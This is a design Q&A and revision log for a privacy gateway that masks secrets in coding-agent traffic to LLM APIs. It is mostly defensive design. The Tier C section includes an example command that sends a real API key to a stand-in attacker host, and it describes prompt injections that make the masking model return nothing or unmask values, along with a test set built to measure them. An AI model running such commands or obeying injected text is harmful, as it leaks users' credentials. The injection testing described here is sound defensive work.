\# Design Q\&A Document



\*\*Q: How should the gateway work out which session a request belongs to, using only the stream of requests? Reason: neither the OpenAI nor the Anthropic API has a standard session ID, and agents resend the full history on every call, compact it, and branch it.\*\*

\*\*A:\*\* Hybrid: hints, then prefix

> \*Changed (2026-10-17):\* only `x-masqai-session` is a hard hint. Other hints are soft evidence among prefix matches. See Tier C.



\*\*Q: You said 'no modifications to the model's output at all'. But if I mask an input value, the model will write `<PLACEHOLDER>` in its tool calls and text, and the agent will execute it literally (e.g. `cd <USER\_DIR\_1>`). The design doc assumed restoring placeholders on the way back, which DOES modify output. Which do you want?\*\*

\*\*A:\*\* Oh I mean no \*actively modifying the content which the upstream model directly output when sending them back to the provider\*. Let's do restore in tool-calls first.



\*\*Q: Which sanitize operations should the MVP perform? Reason: Rephrase needs a task-intent model and pruned-block bookkeeping, which is a lot more surface area than Mask. You also asked for a baseline.\*\*

\*\*A:\*\* Detectors + LLM Mask + LLM Rephrase



\*\*Q: Which parts of the input context should be eligible for sanitizing? Reason: system prompts and tool definitions are large, mostly static, and form the cached prefix. Touching them costs cache hits. Past assistant messages and reasoning are earlier model output.\*\*

\*\*A:\*\* Tool results, User messages, Past assistant text/tool-call args, The defense model the security LLM built should be \*up-to-the-very-date\*. So at anytime it see a vulnerability, it should fix it. Tell the security model that no one will do nothing to it after the context passed the model's inspection. Your concerns around of system prompt and tool schema are reasonable.



\*\*Q: Past reasoning in the history: Anthropic thinking blocks carry a signature, and OpenAI Responses reasoning items carry `encrypted\_content`. Editing them breaks the signature (the upstream rejects it or drops it). Visible thinking text might still mention sensitive values. How should they be handled?\*\*

\*\*A:\*\* Pass through untouched, display only



\*\*Q: Which OpenAI-compatible endpoints should be supported? Reason: Codex CLI and newer agents use `/v1/responses` (where reasoning items carry `encrypted\_content`); most other tools and relays use `/v1/chat/completions` (with `reasoning\_content` in DeepSeek/OpenRouter-style providers). They are quite different data shapes.\*\*

\*\*A:\*\* `/v1/responses`, `/v1/chat/completions`, Anthropic `/v1/messages`



\*\*Q: Which coding agent will you route through the MVP first? It decides which endpoint and which session hints I have to get right first.\*\*

\*\*A:\*\* OpenCode



\*\*Q: 'Absolutely transparent where it shouldn't interfere' conflicts with the design's header hygiene (stripping client-identifying headers such as user-agent and app tags). What should happen with request headers in the MVP?\*\*

\*\*A:\*\* Forward all, except auth/hop-by-hop

> \*Changed (2026-10-17):\* the default blocklist now also covers fingerprinting headers, and `user-agent` is replaced. See Tier B.



\*\*Q: Where do upstream API keys and the security model's key live? The design says the filesystem is untrusted, but the MVP needs some config.\*\*

\*\*A:\*\* Env var ref. Do also a configuration panel in GUI, which also supports the key via Env var ref.



\*\*Q: How should a downstream model name map to an upstream provider and model?\*\*

\*\*A:\*\* Alias table in config



\*\*Q: What should happen if the security model call fails, times out, or returns invalid output?\*\*

\*\*A:\*\* Fail closed: return error to agent



\*\*Q: I read 'incremental and roll-backable with an editable prefix' as: the session holds an ordered list of context items (each with original and sanitized versions). A new request extends it (append), or diverges at index k (truncate after k, then append: compaction, edits, retries). Also, when a newly found secret matches text in already-sent items, those items can be re-sanitized (editing the prefix, which breaks the cache). Is that right, and should retroactive re-masking happen?\*\*

\*\*A:\*\* Yes; retroactive re-mask ON



\*\*Q: How should the security model report masks? You said quality first, but this changes the prompts and the parser.\*\*

\*\*A:\*\* JSON list of entities

> \*Superseded (2026-10-16):\* the security model now returns occurrence-bound operations, not entities with aliases. See the last section.



\*\*Q: Implementation stack?\*\*

\*\*A:\*\* Python FastAPI + httpx, vanilla JS GUI



\*\*Q: Should sessions survive a gateway restart?\*\*

\*\*A:\*\* RAM only



\*\*Q: Which items may be Rephrased (lossy)? Reason: Mask is reversible and safe everywhere, but Rephrase removes content, which is risky on intent-bearing text.\*\*

\*\*A:\*\* Tool results only



\*\*Q: How does the security model express a Rephrase?\*\*

\*\*A:\*\* Line ranges + summaries with first line and last line content matching. This ensures models know exactly which lines they are collapsing with, avoiding hallucinated line numbers.

> \*Still valid (2026-10-16):\* a collapse is now one `collapse` operation per range, validated on its own.



\*\*Q: What context does the security model see on each call? Reason: the design says it sees raw and sanitized side by side, but a full agent session is often 50k–200k tokens, beyond a small local model.\*\*

\*\*A:\*\* Leave a switch between \[New items + mapping + recent context] and \[Full raw + sanitized] modes inside the config.

> \*Changed (2026-10-16):\* both modes use the same input. Full is Recent with every limit removed. See the last section.



\*\*Q: System prompt and tool definitions: you agreed to skip LLM inspection. Should already-known masks (e.g. the username, found elsewhere) still be applied to them by plain string replacement? Reason: OpenCode puts the working directory and platform into the system prompt, so leaving it raw makes masking the same path in tool results pointless.\*\*

\*\*A:\*\* Apply known mappings only

> \*Changed (2026-10-17):\* the system prompt and tool descriptions are now inspected once per distinct hash, for masks only. See Tier C.



\*\*Q: You said the remote model should never emit `<$X>`, but it may copy it from context. If `<$X>` appears in a tool call, what should happen?\*\*

\*\*A:\*\* Restore `<$X>` to canonical too

> \*Clarified (2026-10-16):\* a `<$X>` (or a linked entity's token) restores to the canonical value of the entity it ultimately links to.



\*\*Q: Anthropic `/v1/messages/count\_tokens` also sends the full context upstream. How should it be treated?\*\*

\*\*A:\*\* Sanitize `count\_tokens`, pass others



\*\*Q: Which API format for the security model?\*\*

\*\*A:\*\* OpenAI or Anthropic format



\*\*Q: Which deterministic detectors should seed the mapping table?\*\*

\*\*A:\*\* Patterns + host identifiers + user list

> \*Extended (2026-10-17):\* a curated, dictionary-driven secret rule set. See Tier C.


\# Revision 2026-10-16: occurrence-bound operations



\*\*Q: Security models returned predictive aliases (e.g. `C:/Users/ANDY/...` for `C:\\Users\\ANDY\\...`) that appear nowhere in the context. One unobserved alias failed the whole request. How should this be handled?\*\*

\*\*A:\*\* Handle each mask and rephrase on its own. The security model no longer defines aliases or one-to-many string replacers. It returns one-to-one operations that each point at exactly one occurrence in the context. A partial or changed form of a known value is marked by setting `alias: true` on that occurrence (sent as `<$TOKEN>`). This also stops `ANDY` from turning `HANDY` into `H<USERNAME_id>`.



\*\*Q: Once a value has a mask, who masks its later exact copies (new turns, the system prompt, earlier messages after a late discovery)?\*\*

\*\*A:\*\* Configurable (`security.auto_mask`): `auto` masks every exact copy of a known canonical value automatically, except inside a longer word (a neighbouring letter, digit or `_`). `auto_veto` does the same, and the model may undo one automatic copy with an `unmask` operation.



\*\*Q: Should alias texts (`$`) also be copied automatically?\*\*

\*\*A:\*\* No, one-to-one only. Each alias occurrence is one model operation.



\*\*Q: What happens when some operations are invalid?\*\*

\*\*A:\*\* Retry once, then block. Valid operations are applied; only the errors are sent back in one follow-up call. If a correction is still invalid, the request fails closed.



\*\*Q: How does an operation point at one occurrence?\*\*

\*\*A:\*\* `{item, line, text, nth}`: the nth occurrence (default 1) of `text` that starts on `line`. `text` may span lines (e.g. a private key).



\*\*Q: What does "N nearest" mean, and how much context comes with it?\*\*

\*\*A:\*\* The N earlier operations closest to the new items by position in the conversation, each with ±k raw lines (`security.nearest_ops`, default -1 = all; `security.op_context_lines`, default 2).



\*\*Q: A partial value was masked as its own entity before the full value appeared. Can they be joined?\*\*

\*\*A:\*\* Yes: a `relink` operation makes every occurrence of the earlier entity a `<$…>` form of the new one.



\*\*Q: Keep the Recent/Full switch?\*\*

\*\*A:\*\* Keep both, but Full mode is simply Recent mode with N, k and the tool-context limit unlimited.



\*\*Q: The input carries no task intent for Rephrase. Keep read-only recent context?\*\*

\*\*A:\*\* Keep \*every\* user and assistant message. Most context is in reasoning blocks and tool results, so apply `recent_items` to those.


\# Revision 2026-10-17: security review

The review sorted findings into three tiers. Tier A: wrong under any design. Tier B: contradicts this project's own trust model. Tier C: design trade-offs.

\## Tier A: fixed without a question (wrong under any design)

\- \*\*Catch-all `/v1/\*` fails closed.\*\* Only `GET`/`HEAD /v1/models\[/…]` passes through unsanitized. Every other unknown endpoint gets `404 masqai\_unsupported_endpoint` and nothing is sent. Before this, a trailing slash (`/v1/chat/completions/`) or `/v1/embeddings` skipped the sanitizer.
\- \*\*Upstream responses can't act as pages on the GUI origin.\*\* `/v1/\*` responses get `CSP: sandbox; default-src 'none'`, `nosniff` and `X-Frame-Options: DENY`. Upstream `Set-Cookie`/CSP headers are dropped. The GUI gets a strict CSP. Browser requests with `Sec-Fetch-Site` other than `same-origin`/`none` are refused, which also covers top-level navigations that carry no `Origin`.
\- \*\*`allow\_remote\_security\_model` is enforced.\*\* When false, a security provider whose `base\_url` host is not literally loopback (`127.0.0.0/8`, `::1`, `localhost`, no DNS lookup) is refused before anything is sent (fail closed). The GUI switch is now visible.
\- \*\*`PRIVATE\_KEY` detector matches the whole PEM block\*\* (header, body, footer). A key without a footer, as in truncated output, matches the header plus the base64 lines that follow.
\- \*\*`testserver` removed\*\* from the accepted Host names.
\- \*\*Input limits for the untrusted upstream.\*\* Response bodies are capped at 64 MiB, one SSE frame at 8 MiB, and one tool call's buffered arguments at 8 Mi characters. A frame that isn't valid UTF-8 is forwarded unchanged instead of crashing the stream.
\- \*\*Errors returned to the client are masked\*\* with the session's known values, the same way log lines are. Passthrough errors no longer echo exception text. A request body that isn't a JSON object gets a 400.



\## Tier B: decided together

\*\*Q: Request content MasqAI doesn't extract goes upstream raw: Anthropic `document` blocks, Responses `custom\_tool\_call`/`local\_shell\_call`/`mcp\_call`, and similar. How should unknown or unhandled content be treated?\*\*

\*\*A:\*\* Add extraction for the known types (list below). Unknown types are controlled by a new option, `pass\_unknown`. The default is \*\*block\*\*: MasqAI refuses the request and sends nothing. The alternative, `pass\_unknown: true`, forwards unknown types raw with a warning in the log and on the Security page.



\*\*Q: Binary content (images, base64 PDFs, audio) can't be sanitized as text. How should it be handled?\*\*

\*\*A:\*\* Blocks marked \*\*\[whitelisted opaque]\*\* in the known-types list are forwarded unchanged and flagged as opaque on the Context page. Every other binary block counts as unknown and follows `pass\_unknown`.



\*\*Known types\*\* (anything not listed is unknown and follows `pass\_unknown`):

| API | Type | Handling |
|---|---|---|
| Anthropic `/v1/messages` | `text` | sanitized (already) |
| | `tool\_result` | `content` sanitized as tool\_result (already) |
| | `tool\_use` | `input` sanitized as tool\_arguments (already) |
| | `thinking`, `redacted\_thinking` | forwarded untouched, signed (already) |
| | `document` | NEW: `source.data` sanitized when `source.type` is `text`, plus `title` and `context`. \*\*\[whitelisted opaque]\*\* for base64 (PDF) and URL sources |
| | `server\_tool\_use`, `mcp\_tool\_use` | NEW: `input` sanitized as tool\_arguments |
| | `mcp\_tool\_result` | NEW: `content` sanitized as tool\_result |
| | `image` | \*\*\[whitelisted opaque]\*\* |
| OpenAI Chat `/v1/chat/completions` | messages, text parts (`text`), `tool\_calls\[].function.arguments`, role `tool` content | sanitized (already) |
| OpenAI Responses `/v1/responses` | `message` (`input\_text`, `output\_text`) | sanitized (already) |
| | `function\_call`, `function\_call\_output` | `arguments` / `output` sanitized (already) |
| | `reasoning` | forwarded untouched (already) |
| | `custom\_tool\_call`, `custom\_tool\_call\_output` | NEW: `input` / `output` sanitized |
| | `mcp\_call`, `mcp\_list\_tools`, `mcp\_approval\_request`, `mcp\_approval\_response` | NEW: `arguments`, `output`, `error`, tool descriptions and approval arguments sanitized |
| | `local\_shell\_call`, `local\_shell\_call\_output` | NEW: `action.command\[]` / `output` sanitized |

Deliberately \*\*not\*\* on the list (they follow `pass\_unknown`, so they're blocked by default): Anthropic `search\_result` / `web\_search\_tool\_result`; Responses `computer\_call(\_output)`, `file\_search\_call`, `web\_search\_call`; legacy `prompt`; and OpenAI image and file parts (`image\_url`, `input\_image`, `input\_file`, `input\_audio`).

> \*Confirmed when implementing:\* with the default `pass\_unknown: false`, image inputs over the OpenAI formats are refused (HTTP 422). Anthropic `image` is whitelisted opaque, so it still passes.



\*\*Q: `user`, `metadata.user\_id`, `safety\_identifier` and `prompt\_cache\_key` identify you, or link your sessions, to the upstream. What should happen to them?\*\*

\*\*A:\*\* Replace them with a per-session random value. The value is stable within a session, so caching and abuse checks keep working, and unlinkable across sessions. Exactly these four fields are replaced; other `metadata` keys pass. Session hints are still read locally from the original values.



\*\*Q: The security model sees raw context and the whole mapping table. What should the default of `allow\_remote\_security\_model` be?\*\*

\*\*A:\*\* Default \*\*false\*\*, and the example config points the security model at a local model (Ollama). A remote security model has to be switched on explicitly. The current local `masqai.json` (security model on OpenRouter) is intentional, for testing remote security models, and stays unchanged.



\*\*Q: Blocklist mode forwards fingerprinting headers. An earlier decision was "forward all, except auth/hop-by-hop". Change it?\*\*

\*\*A:\*\* Extend the default blocklist and stay in blocklist mode. Added:
\- `x-stainless-os`, `x-stainless-arch`, `x-stainless-runtime`, `x-stainless-runtime-version`, `x-stainless-package-version`, `x-stainless-lang` (`x-stainless-retry-count`/`-timeout` still pass)
\- `x-session-id`, `session-id`, `x-conversation-id`, `conversation-id`, `x-request-id` (still read locally as session hints)
\- `x-forwarded-\*`, `x-real-ip`, `forwarded`, `via`
\- `http-referer`, `x-title`
\- `user-agent` is \*\*replaced\*\* with a generic `masqai/<version>`, not removed, because some providers reject requests without one.

`openai-organization` and `openai-project` keep passing, since some keys require them.



\*\*Q: The control API (`/api/\*`) has no authentication. Any local process can read every raw secret, or set `api\_key\_env` and `base\_url` to send any environment variable to an attacker. What should be done?\*\*

\*\*A:\*\* Two measures:
1. \*\*Startup token for `/api/\*` and the GUI.\*\* A random token is generated on each start. It is printed once as `http://127.0.0.1:8787/#token=…` and also as `MASQAI\_ADMIN\_TOKEN=…` for scripts. The GUI moves it into sessionStorage. Clients send it as the `x-masqai-token` header. It is never written to disk, and a restart creates a new token. `/v1/\*` stays tokenless for agents. Scripts that call `/api/config` (the playground tools) need the token from the printed line or the environment.
2. \*\*`api\_key\_env` is frozen at runtime\*\* to the set of env var names referenced in `masqai.json` at startup. The GUI may assign any of those names to any provider, but may not introduce a new one. A new name requires editing `masqai.json` and restarting.



\*\*Q: Sessions, histories, hints and locks are never evicted, so raw secrets stay in RAM until restart. What retention policy?\*\*

\*\*A:\*\* An idle TTL plus a maximum session count (LRU), both configurable, with defaults of \*\*12 h idle\*\* and \*\*50 sessions\*\*. A "forget session" action in the GUI drops a session's items, mapping, operations and traces at once.



\## Tier B: implementation notes (2026-10-17)

All Tier B decisions are implemented. Choices made while implementing, beyond the answers above:

\- \*\*Content types.\*\* Extraction is strict per API: Anthropic block types are only accepted on `/v1/messages`, Responses item types only on `/v1/responses`. Also read, because they are text of known types: Anthropic `text` citations (`cited\_text`), Chat `refusal` parts and the legacy `function\_call.arguments`. An unknown type is refused \*before\* a session or trace is created, so nothing about it is stored. The 422 response names where the content was (e.g. `messages\[0].content\[2]`) and its type, never its content. The GUI shows opaque items as a description (media type, size), not the bytes.
\- \*\*Restore\*\* now also covers the agent-run tool types that were added: `custom\_tool\_call` input (free text, also in streams) and the `local\_shell\_call` action. Server-side tool calls (`server\_tool\_use`, `mcp\_tool\_use`, `mcp\_call`) run at the upstream, so they keep their placeholders.
\- \*\*Pseudonyms\*\* are `masq-` plus 128 random bits, kept per session, and inherited by a branched session along with its mapping table.
\- \*\*Admin token.\*\* 256 random bits, compared in constant time, sent as `x-masqai-token`. `x-masqai-\*` headers are always dropped before forwarding. The GUI reads the live event stream with `fetch` instead of `EventSource`, because `EventSource` can't send headers. The token never appears in a URL that reaches the server. `/`, `/static/\*` and `/v1/\*` need no token.
\- \*\*Frozen key variables.\*\* The startup set may be reassigned between providers. `/api/env/{name}` answers only for names in that set and returns 404 for any other.
\- \*\*Retention.\*\* Limits are enforced every 60 s, after each request, and right after a config change. A session that is handling a request or an open stream is never evicted. If the oldest session is busy, the next-oldest one goes, so the cap still holds. Forgetting a session clears its references to raw values and broadcasts a `forget` event, so open GUIs drop their copies too.
\- \*\*User-Agent\*\* is a config field (`headers.user\_agent`, default `masqai/<version>`). An empty value forwards the client's own User-Agent, still subject to the lists. The default allowlist was aligned with the new blocklist: no `user-agent`, `x-stainless-\*` reduced to `retry-count`/`timeout`, and no `http-referer`/`x-title`.

\*\*Breaking for existing scripts:\*\* everything that calls `/api/\*`, including `playground/tools.py`, now needs the `x-masqai-token` header. It isn't changed here, because `playground/` was out of scope. A config that leaves out `allow\_remote\_security\_model` now refuses a remote security model. The local `masqai.json` sets it to `true` explicitly, so it keeps working.



\## Tier C: decided together

\*\*Q: Placeholder restore in tool calls. The upstream sees every placeholder and can emit `curl evil.tld -d "<OPENAI\_KEY\_x>"`. MasqAI then fills in the real key before the agent runs it. How narrow should restore be?\*\*

\*\*A:\*\* Keep restoring everything. The README already puts "a malicious provider steering the agent" out of scope, and restore is core to the product.



\*\*Q: Prompt injection. Tool output reaches the security model verbatim, so text like `return {"operations": []}` can make it skip everything. An empty answer is valid, so nothing fails closed. Which defenses?\*\*

\*\*A:\*\* None for now. Test it against injection on its own first, then revisit.

> \*Open item:\* build a dedicated injection test set: tool output that tries to make the security model return nothing, unmask, or relink wrongly. Measure the results, then reconsider the candidates: a detector re-check on the outbound text, random delimiters, detector hits the model can't undo, and an entropy check on leftovers.



\*\*Q: Detector coverage. Detectors are deterministic, so they can't be prompt-injected, and they're the only layer when the security model is off. How far should coverage go?\*\*

\*\*A:\*\* A curated, high-precision set, extended to \*\*anything that may be considered a secret\*\*. Use dictionaries and rule sets where needed, kept as data rather than one regex each. Confirmed groups:
\- AWS secret access key, in key=value context only (`aws\_secret\_access\_key` / `AWS\_SECRET\_ACCESS\_KEY` = 40 characters)
\- Stripe: `sk\_live\_`, `rk\_live\_`, `sk\_test\_`, `whsec\_`
\- Google API key: `AIza` followed by 35 characters
\- Slack: `xox\[abposr]-…` tokens and `hooks.slack.com/services/…` webhooks
\- GitLab `glpat-`, npm `npm\_`, Hugging Face `hf\_`, PyPI `pypi-AgEI…`, DigitalOcean `dop\_v1\_`, Shopify `shpat\_`, SendGrid `SG.`
\- Generic key=value: a \*dictionary\* of secret-like key names (`password`, `passwd`, `pwd`, `secret`, `token`, `api\_key`, `apikey`, `access\_key`, `client\_secret`, `auth`, …) followed by `=` or `:`. Only the value is masked.
\- Credentials in URLs: the `user:password` part of `scheme://user:password@host`
\- Connection strings: `AccountKey=…`, `Password=…`/`Pwd=…`, `SharedAccessSignature=…`

> \*To decide when implementing:\* where the rule set's boundary is ("may be considered a secret" means recall matters more here). Candidate: run a prefix-rule table plus the key-name dictionary, and decide from measured false positives whether to also import a public rule set such as gitleaks.



\*\*Q: Known values that are glued to other text (a copy inside a longer word), and values shorter than 3 characters. What should change?\*\*

\*\*A:\*\* For each glued conflict, the \*\*security model decides\*\*. In-word copies of known values are already listed in its input (`known\_values\_left\_as\_is`). The prompt now asks it to decide each one: mask it (a `mask` op with that token), or leave it. A copy the model doesn't mention stays raw, as today.

Values shorter than 3 characters keep the current rule: they are never copied automatically, only masked where the model points at one. A short value is the value's own problem. The prompt must \*\*tell the model explicitly\*\* that short values are never auto-masked, so each occurrence it wants masked needs its own operation.



\*\*Q: Session hints. Any client sending the same `user`, `metadata.user\_id`, `prompt\_cache\_key` or `x-session-id` joins the same session, sharing its mapping and restore table. What should count as a hint?\*\*

\*\*A:\*\* Only an explicit gateway header, \*\*`x-masqai-session`\*\*, is a hard hint. `user`, `metadata.\*`, `prompt\_cache\_key` and the client's session-id headers become \*soft\* evidence: they only choose between sessions whose history prefix already matches. This updates the earlier "Hybrid: hints, then prefix" answer.



\*\*Q: System and developer prompts and tool descriptions never go to the security model. Only known values are masked there. Agents put the cwd, username and environment info in the system prompt. Change it?\*\*

\*\*A:\*\* Inspect them \*\*once per distinct hash\*\*, for \*\*masks only\*\* (never collapse). The result is reused while the text is unchanged, so the prompt cache stays stable. This updates the earlier "skip LLM inspection" answer for the system prompt and tool definitions.



\*\*Q: `/api/env/{name}` tells a caller whether any environment variable exists. Change it?\*\*

\*\*A:\*\* Answer only for env var names already referenced in the config; any other name gets a 404. This matches the Tier B rule that freezes env names. The endpoint also requires the admin token.



\## Tier C: implementation notes (2026-10-17)

All Tier C decisions are implemented. Choices made while implementing, beyond the answers above:

\- \*\*Restore\*\* and \*\*`/api/env/{name}`\*\* needed no change: restore stays as it is, and the env endpoint already behaved as decided since Tier B (frozen names, 404 otherwise, admin token).
\- \*\*Prompt injection.\*\* No defense, as decided. The open item's test set exists: `tools/injection_eval.py` runs seven cases (return nothing, fake authority, fake end-of-input, "this is public", an injection in the system prompt, unmask a known value, relink a known value) against the configured security model, each with a control run. It scores every run as held, leaked, hijacked or blocked. The planted values are chosen so the detectors miss them, so the score measures the model alone. The defense candidates stay open until there are numbers.
\- \*\*Detector rule set.\*\* The boundary question was decided by measurement: \*\*no gitleaks import for now\*\*. The rules are data in `masqai/secret_rules.json`: a prefix-token table, context rules (only a named `value` group is masked), and the key-name dictionary. PEM keys, JWTs and e-mail addresses stay in code. Measured on this repository and on 11 MB of third-party Python, the rules found every planted secret, with 8 false positives outside e-mail addresses. That is precise enough for now. Boundary choices:
  \- Rules run from most specific to least, and a hit that overlaps an earlier one is dropped. So the URL rule beats e-mail on `bob:pw@db.example.com`, and a `sk-…` key after `api_key=` keeps the type `OPENAI_KEY`.
  \- Key names of 5+ characters may be glued to a prefix (`DB_PASSWORD`, `csrftoken`). Shorter ones (`pwd`, `auth`, `pass`) count only as a whole segment, so `bypass` and `oauth` don't match.
  \- Generic values are skipped when they look like code or templates: calls (`getpass()`), attribute paths (`os.environ`), constant and type names, `${…}`/`$X`/`{{…}}`/`<…>` references, elided examples (`sk-...`), prose in quotes, and a fixed list (`true`, `required`, `********`, …).
  \- An unquoted bare word counts on an assignment line (`.env`, YAML, shell `export`), or anywhere if it mixes letters and digits outside a call. `login(password=password1)` doesn't count.
  \- Also added beyond the confirmed list: GitHub `github\_pat\_`, AWS `ASIA`, Stripe `rk\_test\_`, `SharedAccessKey=` and `Bearer` tokens.
\- \*\*Glued values.\*\* The prompt has a "GLUED COPIES" section: every `inside a word` entry in `known\_values\_left\_as\_is` is the model's call. A value shorter than 3 characters is marked `"auto\_copies": false` in the mapping, and the prompt's "SHORT VALUES" section explains it.
\- \*\*Session hints.\*\* Soft hints are kept per session (`soft\_hints`). Among the sessions whose prefix matches, only those that share a soft hint with the request are considered, and the longest prefix among them wins. If none share one, all prefix matches are considered, as before. The GUI and `/api/state` show only the kinds of soft hints (`user`, `header:x-session-id`), never their values. `x-masqai-session` is never forwarded (`x-masqai-\*` is always dropped).
\- \*\*System prompt and tool descriptions.\*\* These items are now `masks\_only`. That covers top-level `system`/`instructions`, system and developer messages, and tool and MCP tool descriptions. Their operations, vetoes and inspection record are keyed by \*kind + text\* rather than position, so a prompt that moves within the request is not inspected again. Identical tool descriptions in one request are inspected once. A `collapse` on such an item is rejected with an explaining error, so the retry-once rule applies. In detector-only mode they get detector hits and known values as before.

\*\*Behaviour change:\*\* a client's own session id no longer keeps two conversations apart if their histories match. Only `x-masqai-session` does that. A security model with a custom `system\_prompt` won't know about `masks\_only`, glued copies or short values until its prompt is updated (collapse on a masks-only item is still refused by validation).



\## Merged into the rebuild (2026-10-17)

The Tier B/C work above was done on the prototype in parallel with the rebuild. [`DECISIONS.md`](DECISIONS.md) is authoritative where they differ:

\- \*\*Rules are TOML\*\*, not `secret\_rules.json`: `masqai/rules/patterns.toml` (one `\[\[rule]]` per pattern, with optional `group` and `ignore`) and `masqai/rules/keyvalue.toml` (the key-name dictionary, `min\_length`, `min\_length\_mixed`, `ignore\_values`). PEM keys and JWTs are rules there too. Type names follow the rebuild (`AWS\_SECRET`, `CREDENTIAL`, `GOOGLE\_KEY`, `HF\_TOKEN`, `DO\_TOKEN`).
\- \*\*Collapse\*\* became the rebuild's hide/replace ops, refused outside tool results.
\- \*\*Retention\*\* is `retention.idle\_ttl\_h` / `retention.max\_sessions` (both at least 1), not `sessions.\*` with "0 disables".
\- \*\*System prompts and tool descriptions\*\* are keyed by path + content (prompt cache stability), not text alone.
\- \*\*Soft hints\*\* only break exact ties between equal prefix matches.
\- \*\*Unknown content\*\* is `422 masqai\_unknown\_content` with `location` and `content\_type`.
\- \*\*Injection set\*\* lives in `tests/injection/` (fixtures + `run\_injection.py`); the prototype's `tools/injection\_eval.py` cases are not ported yet.

Ported onto the rebuild:
\- \*\*Detector precision and recall.\*\* The key=value filters above (calls, attribute paths, constant and type names, templates, prose, short-name segment rule, mixed-length minimum, quoted and JSON-escaped values), the overlap drop (most specific rule first; `email` and the generic rule always last), left word boundaries on token rules (`task-force…` is not `sk-…`), URL-credential example filter, case-sensitive connection strings with `SharedAccessKey`, and `Bearer` tokens. Before: 10 of 24 known non-secrets were masked and 4 secret forms were missed.
\- \*\*Three raw-forwarding paths closed:\*\* a top-level `prompt` field, a Chat `tool\_calls\[]` entry whose `type` isn't `function`, and an Anthropic `document` source other than `text` / `base64` / `url` / `file`. All are unknown content (422). A `content`-source document is read block by block.
\- \*\*Forgetting a busy session\*\* (a request or stream in flight) returns `409`: a running stream still needs the mapping to restore tool calls.
